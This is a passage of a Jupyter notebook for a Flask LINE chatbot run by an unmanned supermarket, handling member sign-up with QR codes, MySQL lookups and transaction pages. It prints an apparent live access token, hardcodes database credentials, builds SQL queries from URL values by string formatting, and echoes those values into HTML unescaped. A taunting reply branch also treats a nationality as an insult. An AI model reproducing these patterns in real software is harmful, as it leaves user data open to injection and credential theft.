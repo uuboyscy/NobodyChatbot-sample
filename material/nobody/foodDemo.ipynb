{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "\"\"\"\n",
    "\n",
    "當用戶想要重新觀看歡迎訊息時，可輸入特定文字，Server會重新寄發歡迎訊息\n",
    "\n",
    "當用戶發送指定文字消息時，會發送相應的圖片消息給用戶\n",
    "\n",
    "\"\"\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'0da3c1a2.ngrok.io'"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\"\"\"\n",
    "\n",
    "啟用伺服器基本樣板\n",
    "\n",
    "\"\"\"\n",
    "\n",
    "# 引用Web Server套件\n",
    "from flask import Flask, request, abort\n",
    "\n",
    "# 從linebot 套件包裡引用 LineBotApi 與 WebhookHandler 類別\n",
    "from linebot import (\n",
    "    LineBotApi, WebhookHandler\n",
    ")\n",
    "\n",
    "# 引用無效簽章錯誤\n",
    "from linebot.exceptions import (\n",
    "    InvalidSignatureError\n",
    ")\n",
    "\n",
    "# 載入json處理套件\n",
    "import json\n",
    "\n",
    "# 載入基礎設定檔\n",
    "secretFileContentJson=json.load(open(\"../line_secret_key\",'r'))\n",
    "server_url=secretFileContentJson.get(\"server_url\")\n",
    "\n",
    "# 設定Server啟用細節\n",
    "app = Flask(__name__,static_url_path = \"/food\" , static_folder = \"../food/\")\n",
    "\n",
    "# 生成實體物件\n",
    "line_bot_api = LineBotApi(secretFileContentJson.get(\"channel_access_token\"))\n",
    "handler = WebhookHandler(secretFileContentJson.get(\"secret_key\"))\n",
    "\n",
    "# 啟動server對外接口，使Line能丟消息進來\n",
    "@app.route(\"/\", methods=['POST'])\n",
    "def callback():\n",
    "    # get X-Line-Signature header value\n",
    "    signature = request.headers['X-Line-Signature']\n",
    "\n",
    "    # get request body as text\n",
    "    body = request.get_data(as_text=True)\n",
    "    app.logger.info(\"Request body: \" + body)\n",
    "\n",
    "    # handle webhook body\n",
    "    try:\n",
    "        handler.handle(body, signature)\n",
    "    except InvalidSignatureError:\n",
    "        abort(400)\n",
    "\n",
    "    return 'OK'\n",
    "server_url"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "5RNqdlI7TNU2iXy8VLLhuYY6XEqcLzzCAV2I4f6UAZ4s/l8jDBMvjQkzxvlVOLLqL8IRtN/3YaxjcXkZJMBSbqt82yGSJjD885hForRc7zAF298FMHmxQ+EixfVg6l+cd55SEQSj9U0ZhEwDPsfiJFGUYhWQfeY8sLGRXgo3xvw=\n"
     ]
    }
   ],
   "source": [
    "token = secretFileContentJson.get(\"channel_access_token\")\n",
    "print(token)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Connected successfully!\n"
     ]
    }
   ],
   "source": [
    "# MySQL套件\n",
    "import pymysql\n",
    "\n",
    "# 將QRcode上傳MySQL資料庫\n",
    "conn = pymysql.connect(\n",
    "    host = \"uuboyscymysql.clrhltpp3icl.ap-northeast-1.rds.amazonaws.com\",\n",
    "    port = int(3306),user = \"food\",\n",
    "    password = \"food\",\n",
    "    db = \"food\",\n",
    "    charset='utf8', \n",
    "    cursorclass=pymysql.cursors.DictCursor \n",
    "    )\n",
    "cursor = conn.cursor()\n",
    "print('Connected successfully!')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "'''\n",
    "\n",
    "製作文字與圖片發送消息\n",
    "\n",
    "'''\n",
    "\n",
    "# 將消息模型，文字收取消息與文字寄發消息 引入\n",
    "from linebot.models import (\n",
    "    MessageEvent, TextMessage, TextSendMessage, ImageSendMessage\n",
    ")\n",
    "\n",
    "# 設定消息素材\n",
    "\n",
    "'''\n",
    "\n",
    "製作文字與圖片的教學訊息\n",
    "\n",
    "'''\n",
    "# 將消息模型，文字收取消息與文字寄發消息 引入\n",
    "from linebot.models import (\n",
    "    MessageEvent, TextMessage, TextSendMessage, ImageSendMessage\n",
    ")\n",
    "\n",
    "# 消息清單\n",
    "reply_message_list = [\n",
    "TextSendMessage(text=\"歡迎光臨無人超市\"),\n",
    "    TextSendMessage(text=\"更多資訊請點選下列選單\")\n",
    "]\n",
    "\n",
    "'''\n",
    "\n",
    "撰寫用戶關注時，我們要處理的商業邏輯\n",
    "\n",
    "1. 取得用戶個資，並存回伺服器\n",
    "2. 把先前製作好的自定義菜單，與用戶做綁定\n",
    "3. 回應用戶，歡迎用的文字消息與圖片消息\n",
    "4. 製作該用戶的QRcode\n",
    "5. 將QRcode同時保存於資料庫及'../food'\n",
    "6. 同時將userID上傳至資料庫\n",
    "\n",
    "'''\n",
    "\n",
    "\n",
    "# 載入Follow事件\n",
    "from linebot.models.events import (\n",
    "    FollowEvent\n",
    ")\n",
    "\n",
    "# 載入requests套件\n",
    "import requests\n",
    "\n",
    "# 製作QRcode的程式\n",
    "import create_qrcode\n",
    "\n",
    "\n",
    "# 告知handler，如果收到FollowEvent，則做下面的方法處理\n",
    "@handler.add(FollowEvent)\n",
    "def reply_text_and_get_user_profile(event):\n",
    "    \n",
    "    # 取出消息內User的資料\n",
    "    user_profile = line_bot_api.get_profile(event.source.user_id)\n",
    "        \n",
    "     # 將用戶資訊存在檔案內\n",
    "    with open(\"../foodusers.txt\", \"a\") as myfile:\n",
    "        myfile.write(json.dumps(vars(user_profile),sort_keys=True))\n",
    "        myfile.write('\\r\\n')\n",
    "    print()\n",
    "        \n",
    "        \n",
    "    # 將菜單綁定在用戶身上\n",
    "    linkRichMenuId=secretFileContentJson.get(\"rich_menu_id\")\n",
    "    linkMenuEndpoint='https://api.line.me/v2/bot/user/%s/richmenu/%s' % (event.source.user_id, linkRichMenuId)\n",
    "    linkMenuRequestHeader={'Content-Type':'image/jpeg','Authorization':'Bearer %s' % secretFileContentJson[\"channel_access_token\"]}\n",
    "    lineLinkMenuResponse=requests.post(linkMenuEndpoint,headers=linkMenuRequestHeader)\n",
    "    \n",
    "    # 製作該使用者QRcode\n",
    "    create_qrcode.create_qrcode(user_profile.user_id, user_profile.user_id)\n",
    "    \n",
    "    # 將使用者userID, name, qrcode 上傳至MySQL資料庫\n",
    "    f = open('../food/%s.jpg'%(user_profile.user_id), 'rb')\n",
    "    qrcode = f.read()\n",
    "    f.close()\n",
    "    try:\n",
    "        cursor.execute(\"INSERT INTO membersInfo SET userID=%s, name=%s, qrcode=%s\", \n",
    "                       (str(user_profile.user_id), \n",
    "                        str(user_profile.display_name), \n",
    "                        qrcode))\n",
    "        conn.commit()\n",
    "        # 回覆文字消息與圖片消息\n",
    "        line_bot_api.reply_message(\n",
    "            event.reply_token,[\n",
    "                TextSendMessage(text=\"歡迎光臨NobodyMart無人超市，感謝您成為NobodyMart會員！\"),\n",
    "                TextSendMessage(text=\"尊敬的 %s 會員您好！\"%(user_profile.display_name)),\n",
    "                TextSendMessage(text=\"您的USER_ID是 \" + user_profile.user_id),\n",
    "                TextSendMessage(text=\"您的QR_code，進入超市前請先出示QR_code驗證身份\"),\n",
    "                ImageSendMessage(original_content_url='https://%s/food/%s.jpg' %(server_url, user_profile.user_id),\n",
    "                                 preview_image_url='https://%s/food/%s.jpg' %(server_url, user_profile.user_id)),\n",
    "                TextSendMessage(text=\"更多資訊請點選下列選單\"),       \n",
    "            ]\n",
    "        )\n",
    "    except pymysql.IntegrityError:\n",
    "        print(\"Error \", user_profile.user_id, \" existed.\")\n",
    "        line_bot_api.reply_message(\n",
    "            event.reply_token,[\n",
    "                TextSendMessage(text=\"Hi～ %s ，歡迎光臨NobodyMart無人超市！\"%(user_profile.display_name)),\n",
    "                TextSendMessage(text=\"您的USER_ID是 \" + user_profile.user_id),\n",
    "                TextSendMessage(text=\"您的QR_code，進入超市前請先出示QR_code驗證身份\"),\n",
    "                ImageSendMessage(original_content_url='https://%s/food/%s.jpg' %(server_url, user_profile.user_id),\n",
    "                                 preview_image_url='https://%s/food/%s.jpg' %(server_url, user_profile.user_id)),\n",
    "                TextSendMessage(text=\"更多資訊請點選下列NobodyMartMenu\"),       \n",
    "            ]\n",
    "        )\n",
    "    except:\n",
    "        print(\"Error \", user_profile.user_id)\n",
    "        line_bot_api.reply_message(\n",
    "            event.reply_token,[\n",
    "                TextSendMessage(text=\"Hi～ %s ，歡迎光臨NobodyMart無人超市！\"%(user_profile.display_name)),\n",
    "                TextSendMessage(text=\"您的USER_ID是 \" + user_profile.user_id),\n",
    "                TextSendMessage(text=\"您的QR_code，進入超市前請先出示QR_code驗證身份\"),\n",
    "                ImageSendMessage(original_content_url='https://%s/food/%s.jpg' %(server_url, user_profile.user_id),\n",
    "                                 preview_image_url='https://%s/food/%s.jpg' %(server_url, user_profile.user_id)),\n",
    "                TextSendMessage(text=\"更多資訊請點選下列NobodyMartMenu\"),       \n",
    "            ]\n",
    "        )\n",
    "    #print('userID existed.')\n",
    "    \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [],
   "source": [
    "'''\n",
    "\n",
    "建立圖片消息素材\n",
    "\n",
    "'''\n",
    "\n",
    "# 將消息模型，文字收取消息與文字寄發消息 引入\n",
    "from linebot.models import (\n",
    "    ImageSendMessage, TextSendMessage\n",
    ")\n",
    "\n",
    "# 圖片消息的基本建構特徵\n",
    "image_message = TextSendMessage(text='2019-01-23\\n雞肉(1)($ 80)\\n麵粉(1)($ 50)\\n------------------\\nTotal  $130')\n",
    "image_message2 = TextSendMessage(text='暫無紀錄')\n",
    "image_message3 = TextSendMessage(text='此功能未實裝')\n",
    "\n",
    "image_message4 = TextSendMessage(text='不能改哦～這功能放好玩的！')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "'''\n",
    "\n",
    "設計一個Carousel Flex\n",
    "引入carousel的python檔\n",
    "引入交易紀錄查詢的python程式\n",
    "\n",
    "'''\n",
    "# 食譜推薦\n",
    "import recipe_recommanded_carousel\n",
    "\n",
    "# 會員中心\n",
    "import member_center\n",
    "\n",
    "# 食譜推薦\n",
    "flexCarouselContainerJsonDict = recipe_recommanded_carousel.flexCarouselContainerJsonDict\n",
    "\n",
    "# 會員中心\n",
    "\n",
    "# 交易紀錄\n",
    "import transaction_history"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "'''\n",
    "\n",
    "將carousel類型的json 進行轉換變成 Python可理解之類型物件\n",
    "\n",
    "將該物件封裝進 Flex Message中\n",
    "\n",
    "\n",
    "'''\n",
    "\n",
    "from linebot.models import(\n",
    "    FlexSendMessage,CarouselContainer,BubbleContainer\n",
    ")\n",
    "\n",
    "import json\n",
    "\n",
    "carouselContent = CarouselContainer.new_from_json_dict(json.loads(flexCarouselContainerJsonDict))\n",
    "flexCarouselSendMeesage =  FlexSendMessage(alt_text=\"hello\", contents=carouselContent)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "'''\n",
    "\n",
    "設計一個字典\n",
    "    當用戶輸入相應文字消息時，系統會從此挑揀消息\n",
    "\n",
    "'''\n",
    "\n",
    "# 根據自定義菜單四張故事線的圖，設定相對應image\n",
    "template_message_dict = {\n",
    "    \"[::text:]本次交易\":image_message,\n",
    "    \"[::text:]歷史交易\":image_message2,\n",
    "    \"[::flex:]促銷食材\":flexCarouselSendMeesage,\n",
    "    \"[::text:]會員中心\":image_message3,\n",
    "    \"[::text:]more\":image_message3,\n",
    "    \"[::text:]Modify\":image_message4,\n",
    "    \"[::text:]tryLiff\":image_message3\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Linebot  sendReplyMessage"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "'''\n",
    "\n",
    "當用戶發出文字消息時，判斷文字內容是否包含[::text:]，\n",
    "    若有，則從template_message_dict 內找出相關訊息\n",
    "    若無，則回傳預設訊息。\n",
    "\n",
    "'''\n",
    "from random import randint\n",
    "\n",
    "# 用來將過多的Liff刪除\n",
    "from liff_api import *\n",
    "# initiate token\n",
    "liff_init(secretFileContentJson.get(\"channel_access_token\"))\n",
    "\n",
    "# 使用Line notify將使用者傳來的訊息導向管理員的回覆畫面\n",
    "import line_notify\n",
    "\n",
    "import imp\n",
    "import sys\n",
    "import os\n",
    "\n",
    "# 用戶發出文字消息時， 按條件內容, 回傳文字消息\n",
    "@handler.add(MessageEvent, message=TextMessage)\n",
    "def handle_message(event):\n",
    "    \n",
    "    # to remove leftover liff\n",
    "    try:\n",
    "        if len(liff_list()['apps']) >= 15:\n",
    "            for i in liff_list()['apps']:\n",
    "                liff_delete(i['liffId'])\n",
    "    except:\n",
    "        print('Liffs have been all removed.')\n",
    "    \n",
    "    # 取出消息內User的資料\n",
    "    user_profile = line_bot_api.get_profile(event.source.user_id)\n",
    "    notify_token = secretFileContentJson.get(\"notify_token\")\n",
    "    notify_msg = \"\"\"\n",
    "    From : %s\n",
    "    UserName : %s\n",
    "    Said : %s\n",
    "    -----------\n",
    "    Reply\n",
    "    https://%s/pushMessage/%s\n",
    "    \"\"\"%(user_profile.user_id, user_profile.display_name, event.message.text, server_url, user_profile.user_id)\n",
    "    print(notify_msg)\n",
    "    line_notify.lineNotify(notify_token, notify_msg)\n",
    "    \n",
    "    # 更改為該會員資訊\n",
    "    if(event.message.text.find('[::text:]會員中心')!= -1):\n",
    "        qrcodeurl = 'https://%s/food/%s.jpg' %(server_url, user_profile.user_id)\n",
    "        cursor.execute(\"SELECT name FROM membersInfo WHERE userID='%s'\"%(user_profile.user_id))\n",
    "\n",
    "        try:\n",
    "            username = (cursor.fetchone()['name']).encode('utf-8').decode('unicode-escape')\n",
    "        except TypeError:\n",
    "            print('TypeError in username.')\n",
    "            username = 'User name error please modify'\n",
    "        except:\n",
    "            print('Unexpected error.')\n",
    "            username = 'User name error please modify'\n",
    "        flexCarouselContainerJsonDict_member_center = member_center.member_centre_flex(user_profile.user_id, server_url, qrcodeurl, (user_profile.user_id), username)    \n",
    "        try:\n",
    "            carouselContent_member_center = CarouselContainer.new_from_json_dict(json.loads(flexCarouselContainerJsonDict_member_center))\n",
    "        except json.decoder.JSONDecodeError:\n",
    "            print('json.decoder.JSONDecodeError in handle_message.')\n",
    "            username = 'User name error please modify'\n",
    "            flexCarouselContainerJsonDict_member_center = member_center.member_centre_flex(user_profile.user_id, server_url, qrcodeurl, (user_profile.user_id), username)\n",
    "            carouselContent_member_center = CarouselContainer.new_from_json_dict(json.loads(flexCarouselContainerJsonDict_member_center))\n",
    "        flexCarouselSendMeesage_member_center =  FlexSendMessage(alt_text=\"Member centre\", contents=carouselContent_member_center)\n",
    "\n",
    "        template_message_dict[\"[::text:]會員中心\"] = flexCarouselSendMeesage_member_center\n",
    "        \n",
    "    # Try Liff\n",
    "    if(event.message.text.find('[::text:]tryLiff')!= -1):\n",
    "        flexBubbleContainerJsonString_transaction_data = transaction_history.tryLiff()\n",
    "        bubbleContainer_transaction_data= BubbleContainer.new_from_json_dict(json.loads(flexBubbleContainerJsonString_transaction_data))\n",
    "        flexBubbleSendMessage_transaction_data =  FlexSendMessage(alt_text=\"try\", contents=bubbleContainer_transaction_data)\n",
    "        template_message_dict[\"[::text:]tryLiff\"] = flexBubbleSendMessage_transaction_data\n",
    "    \n",
    "    # 透過MySQL查詢歷史交易\n",
    "    if(event.message.text.find('[::text:]歷史交易')!= -1):\n",
    "        conn.commit()\n",
    "        cursor.execute(\"SELECT datetime FROM transaction WHERE userID = '%s' GROUP BY orderID DESC LIMIT 7\"%(user_profile.user_id))\n",
    "        transaction_data = cursor.fetchall()\n",
    "        # 將交易紀錄資料送入flex轉換的transaction_history.py python程式\n",
    "        flexBubbleContainerJsonString_transaction_data = transaction_history.transaction_flex(user_profile.user_id, server_url, transaction_data)\n",
    "        bubbleContainer_transaction_data= BubbleContainer.new_from_json_dict(json.loads(flexBubbleContainerJsonString_transaction_data))\n",
    "        flexBubbleSendMessage_transaction_data =  FlexSendMessage(alt_text=\"Transaction history\", contents=bubbleContainer_transaction_data)\n",
    "        template_message_dict[\"[::text:]歷史交易\"] = flexBubbleSendMessage_transaction_data\n",
    "    \n",
    "    # 本次即時交易紀錄\n",
    "    if(event.message.text.find('[::text:]本次交易')!= -1):\n",
    "        # 將UserID送入flex轉換的transaction_history.py python程式\n",
    "        flexBubbleContainerJsonString_transaction_data = transaction_history.transaction_now_flex(user_profile.user_id, server_url)\n",
    "        bubbleContainer_transaction_data= BubbleContainer.new_from_json_dict(json.loads(flexBubbleContainerJsonString_transaction_data))\n",
    "        flexBubbleSendMessage_transaction_data =  FlexSendMessage(alt_text=\"Current transaction\", contents=bubbleContainer_transaction_data)\n",
    "        template_message_dict[\"[::text:]本次交易\"] = flexBubbleSendMessage_transaction_data\n",
    "    \n",
    "    # 食譜推薦，調用暫時carousel\n",
    "    if(event.message.text.find('[::flex:]促銷食材')!= -1):\n",
    "        # 導入暫時carousel的py檔\n",
    "        tmp_user_id = user_profile.user_id\n",
    "        if os.path.isfile(r'./%s.py'%(tmp_user_id)):\n",
    "            carousel_module = '%s'%(tmp_user_id)\n",
    "            mod = __import__(carousel_module, fromlist=[''])        \n",
    "            print('mod',mod)\n",
    "            dirmod = dir(mod)\n",
    "            print('dirmod',dirmod)\n",
    "            #flexCarouselContainerJsonDict      \n",
    "            imp.reload(sys.modules['%s'%(tmp_user_id)]) \n",
    "            flexCarouselContainerJsonDict = sys.modules['%s'%(tmp_user_id)].flexCarouselContainerJsonDict\n",
    "            carouselContent = CarouselContainer.new_from_json_dict(json.loads(flexCarouselContainerJsonDict))\n",
    "            flexCarouselSendMeesage =  FlexSendMessage(alt_text=\"recommanded\", contents=carouselContent)\n",
    "            template_message_dict[\"[::flex:]促銷食材\"] = flexCarouselSendMeesage\n",
    "        else:\n",
    "            import U7173dc299af6ac3fe7697a75c2a280ad\n",
    "            #flexCarouselContainerJsonDict      \n",
    "            imp.reload(U7173dc299af6ac3fe7697a75c2a280ad) \n",
    "            flexCarouselContainerJsonDict = U7173dc299af6ac3fe7697a75c2a280ad.flexCarouselContainerJsonDict\n",
    "            carouselContent = CarouselContainer.new_from_json_dict(json.loads(flexCarouselContainerJsonDict))\n",
    "            flexCarouselSendMeesage =  FlexSendMessage(alt_text=\"recommanded\", contents=carouselContent)\n",
    "            template_message_dict[\"[::flex:]促銷食材\"] = flexCarouselSendMeesage\n",
    "    \n",
    "    if(event.message.text.find('::text:')!= -1) or (event.message.text.find('::flex:')!= -1):\n",
    "        line_bot_api.reply_message(\n",
    "        event.reply_token,\n",
    "        template_message_dict.get(event.message.text)\n",
    "        )\n",
    "    elif(event.message.text.find('白痴')!= -1) or (event.message.text.find('笨蛋')!= -1) or (event.message.text.find('智障')!= -1) or (event.message.text.find('神經病')!= -1) or (event.message.text.find('有病')!= -1) or (event.message.text.find('王八蛋')!= -1) or (event.message.text.find('傻蛋')!= -1) or (event.message.text.find('台灣人')!= -1) :\n",
    "        tmpstr = ''\n",
    "        if event.message.text.find('笨蛋')!= -1:\n",
    "            tmpstr = '笨蛋'\n",
    "        if event.message.text.find('白痴')!= -1:\n",
    "            tmpstr = '白痴'\n",
    "        if event.message.text.find('智障')!= -1:\n",
    "            tmpstr = '智障'\n",
    "        if event.message.text.find('神經病')!= -1:\n",
    "            tmpstr = '神經病'\n",
    "        if event.message.text.find('有病')!= -1:\n",
    "            tmpstr = '有病'\n",
    "        if event.message.text.find('王八蛋')!= -1:\n",
    "            tmpstr = '王八蛋'\n",
    "        if event.message.text.find('傻蛋')!= -1:\n",
    "            tmpstr = '傻蛋'\n",
    "        if event.message.text.find('台灣人')!= -1:\n",
    "            tmpstr = '台灣人'\n",
    "        if randint(0,4) == 1:\n",
    "            line_bot_api.reply_message(\n",
    "                event.reply_token,\n",
    "                TextSendMessage(text='你才%s！'%(tmpstr))\n",
    "            )\n",
    "        elif randint(0,4) == 2:\n",
    "            line_bot_api.reply_message(\n",
    "                event.reply_token,\n",
    "                TextSendMessage(text='%s才會說別人是%s！'%(tmpstr, tmpstr))\n",
    "            )\n",
    "        elif randint(0,4) == 3:\n",
    "            line_bot_api.reply_message(\n",
    "                event.reply_token,\n",
    "                TextSendMessage(text='今天天氣真好！')\n",
    "            )\n",
    "        elif randint(0,4) == 4:\n",
    "            line_bot_api.reply_message(\n",
    "                event.reply_token,\n",
    "                TextSendMessage(text='你媽貴姓？！')\n",
    "            )\n",
    "        else:\n",
    "            line_bot_api.reply_message(\n",
    "                event.reply_token,\n",
    "                TextSendMessage(text='你全家都%s！'%(tmpstr))\n",
    "            )\n",
    "    elif (event.message.text.find('幹你娘')!= -1) or (event.message.text.find('靠北')!= -1) or (event.message.text.find('靠背')!= -1) or (event.message.text.find('操你')!= -1) or (event.message.text.find('操他媽')!= -1) or (event.message.text.find('靠被')!= -1) or (event.message.text.find('幹他媽')!= -1) or (event.message.text.find('幹你')!= -1) or (event.message.text.find('靠杯')!= -1) or (event.message.text.find('去死')!= -1) or (event.message.text.find('fuck')!= -1) or (event.message.text.find('shit')!= -1) or (event.message.text.find('愛你')!= -1) or (event.message.text.find('按陰陽')!= -1) or (event.message.text.find('喜歡你')!= -1) or (event.message.text.find('討厭')!= -1):\n",
    "        if randint(0,4) == 1:\n",
    "            line_bot_api.reply_message(\n",
    "                event.reply_token,\n",
    "                TextSendMessage(text='你確定？')\n",
    "            )\n",
    "        elif randint(0,4) == 2:\n",
    "            line_bot_api.reply_message(\n",
    "                event.reply_token,\n",
    "                TextSendMessage(text='這樣不太好吧？')\n",
    "            )\n",
    "        elif randint(0,4) == 3:\n",
    "            line_bot_api.reply_message(\n",
    "                event.reply_token,\n",
    "                TextSendMessage(text='今天天氣真好！')\n",
    "            )\n",
    "        elif randint(0,4) == 4:\n",
    "            line_bot_api.reply_message(\n",
    "                event.reply_token,\n",
    "                TextSendMessage(text='你媽貴姓？！')\n",
    "            )\n",
    "        else:\n",
    "            line_bot_api.reply_message(\n",
    "                event.reply_token,\n",
    "                TextSendMessage(text='讓我考慮考慮')\n",
    "            )\n",
    "    else:\n",
    "        '''line_bot_api.reply_message(\n",
    "        event.reply_token,\n",
    "        TextSendMessage(text=[\"請點擊功能選單，或輸入[::text:]more，取得更多幫助\"+str(event.message.text)+\"test\", \"second\"])\n",
    "        )'''\n",
    "        line_bot_api.reply_message(\n",
    "        event.reply_token,\n",
    "        {'%s'%(str(event.message.text)) : [TextSendMessage(text='%s'%(str(event.message.text).replace('?', '!').replace('？', '！').replace('嗎','').replace('我','你'))), TextSendMessage(text='點擊下方NobodyMartMenu，取得更多幫助。')],\n",
    "        '更多幫助':image_message3,\n",
    "        '更多資訊':image_message3,\n",
    "        'more':image_message3}.get(event.message.text)\n",
    "        )\n",
    "        '''{\"%s\"%(str(event.message.text)) : ['123', 'test', '456']}.get(event.message.text)'''"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 歷史交易紀錄"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "'''\n",
    "\n",
    "查詢歷史交易紀錄之接口\n",
    "\n",
    "'''\n",
    "\n",
    "@app.route('/transaction/<userID>/<datetime>', methods = ['GET'])\n",
    "def transactionInfo(userID, datetime):\n",
    "    # transaction query\n",
    "    cursor.execute(\"SELECT tr.orderID, pt.productName, tr.productQTY, pt.productUnitPrice, tr.productQTY*pt.productUnitPrice subtotal FROM transaction tr \\\n",
    "    LEFT JOIN productTable pt \\\n",
    "    ON tr.productID = pt.productID \\\n",
    "    WHERE userID = '%s' AND datetime='%s'\"%(userID, datetime))\n",
    "    trInfo = cursor.fetchall()\n",
    "    # total\n",
    "    cursor.execute(\"SELECT SUM(tr.productQTY*pt.productUnitPrice) total FROM transaction tr \\\n",
    "    LEFT JOIN productTable pt \\\n",
    "    ON tr.productID = pt.productID \\\n",
    "    WHERE userID = '%s' AND datetime='%s'\"%(userID, datetime))\n",
    "    trTotal = cursor.fetchall()\n",
    "    \n",
    "    # head\n",
    "    outStr = \"\"\"\n",
    "    <html>\n",
    "    <head>\n",
    "    <title>Order_ID : %s</title>\n",
    "    <link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css\">\n",
    "    <link href=\"https://%s/food/web_js_css/flexslider.css\" rel=\"stylesheet\" type=\"text/css\" />\n",
    "    <link rel=\"stylesheet\" href=\"https://www.w3schools.com/w3css/4/w3.css\">\n",
    "    \n",
    "    </head>\n",
    "    \"\"\"%(trInfo[0]['orderID'], server_url)\n",
    "    # body\n",
    "    outStr += \"\"\"\n",
    "    <body>  \n",
    "    \n",
    "    <script src=\"https://%s/food/web_js_css/jquery.min.js\"></script>\n",
    "    <script src=\"https://%s/food/web_js_css/jquery.flexslider.js\"></script>\n",
    "    <div class=\"w3-animate-opacity\">\n",
    "    <div class=\"col-lg-9 col-lg-offset-9\">\n",
    "    \"\"\"%(server_url, server_url)\n",
    "    # body-table\n",
    "    outStr += \"\"\"\n",
    "    <table class=\"table\" style=\"font-size:30px;font-family:serif;\">\n",
    "                <thead>\n",
    "                    <tr class=\"danger\">\n",
    "                        <th>No.</th>\n",
    "                        <th>Product Name</th>\n",
    "                        <th>Quantity</th>\n",
    "                        <th>Unit Price</th>\n",
    "                        <th>Subtotal</th>\n",
    "                    </tr>\n",
    "                </thead>    \n",
    "    \"\"\"\n",
    "    # tbody\n",
    "    outStr += \"\"\"\n",
    "    <tbody>\n",
    "    \"\"\"\n",
    "    for i in range(0, len(trInfo)):\n",
    "        tcolor = [\"success\", \"warning\"]\n",
    "        outStr += \"\"\"\n",
    "        <tr class=\"%s\">\n",
    "            <td>%s</td>\n",
    "            <td>%s</td>\n",
    "            <td>%s</td>\n",
    "            <td>$ %s</td>\n",
    "            <td>$ %s</td>\n",
    "        </tr>\n",
    "        \"\"\"%(tcolor[i%2], i+1, trInfo[i]['productName'], trInfo[i]['productQTY'], trInfo[i]['productUnitPrice'], trInfo[i]['subtotal'])\n",
    "    outStr += \"\"\"\n",
    "    <thead>\n",
    "        <tr class=\"danger\">\n",
    "        <th>Total</th>\n",
    "        <th>-</th>\n",
    "        <th>-</th>\n",
    "        <th>-</th>\n",
    "        <th>$ %s</th>\n",
    "        </tr>\n",
    "    </thead>\n",
    "    \"\"\"%(trTotal[0]['total'])\n",
    "    outStr += \"\"\"\n",
    "    </tbody>\n",
    "    </table>\n",
    "    \"\"\"\n",
    "    # carousel\n",
    "    outStr += \"\"\"\n",
    "    <br><br>\n",
    "    <div style=\"margin:0 auto;\"><h1><p align=center>-  On-sale products  -</p><h1></div>\n",
    "    <div class=\"container\">\n",
    "    <script type=\"text/javascript\">\n",
    "    $(window).load(function() {\n",
    "    $('.flexslider').flexslider({\n",
    "          slideshowSpeed: 5000,\n",
    "          animationSpeed: 500,\n",
    "          animation: \"slide\",\n",
    "          touch: true\n",
    "          });\n",
    "    });\n",
    "    </script>\n",
    "    <div class=\"flexslider\" style=\"width:450px;  margin:0 auto;\">\n",
    "    <ul class=\"slides\">\n",
    "        <li><img src=\"https://pgw.udn.com.tw/gw/photo.php?u=https://uc.udn.com.tw/photo/2018/05/29/draft/4804805.jpeg&x=0&y=0&sw=0&sh=0&exp=3600\" alt=\"\" width=\"350\" height=\"200\"></li>\n",
    "        <li><img src=\"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQgszxK4wWxfhfCokY5PwlL52bzi6FTa7vILrrewvOPW6-jDeYGzg\" alt=\"\" width=\"350\" height=\"200\"></li>\n",
    "        <li><img src=\"https://www.foodnext.net/dispPageBox/getFile/GetImg.aspx?FileLocation=/PJ-FOODNEXT/Files/&FileName=photo-08083-i.jpg\" alt=\"\" width=\"350\" height=\"200\"></li>\n",
    "    </ul>\n",
    "    </div>\n",
    "    </div>\n",
    "    \"\"\"\n",
    "\n",
    "    # logo image\n",
    "    outStr += \"\"\"\n",
    "    <div class=\"container\">\n",
    "    <img class=\"img-responsive\" src=\"https://%s/food/logo.png\">\n",
    "    </div>\n",
    "    \"\"\"%(server_url)\n",
    "    # /body\n",
    "    outStr += \"\"\"\n",
    "    </div>\n",
    "    </div>\n",
    "    </body>\n",
    "    </html>\n",
    "    \"\"\"\n",
    "    \n",
    "    return outStr\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# 即時交易紀錄(購物車)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [],
   "source": [
    "'''\n",
    "\n",
    "查詢當下交易紀錄之接口\n",
    "\n",
    "'''\n",
    "\n",
    "@app.route('/transaction/now/<userID>', methods = ['GET'])\n",
    "def transactionNow(userID):\n",
    "    # head\n",
    "    outStr = \"\"\"\n",
    "    <html>\n",
    "    <head>\n",
    "    <title>User_ID : %s</title>\n",
    "    <meta http-equiv=\"refresh\" content=\"5\" />\n",
    "    <link rel=\"stylesheet\" href=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css\">\n",
    "    <link href=\"https://%s/food/web_js_css/flexslider.css\" rel=\"stylesheet\" type=\"text/css\" />\n",
    "    <link rel=\"stylesheet\" href=\"https://www.w3schools.com/w3css/4/w3.css\">\n",
    "    </head>\n",
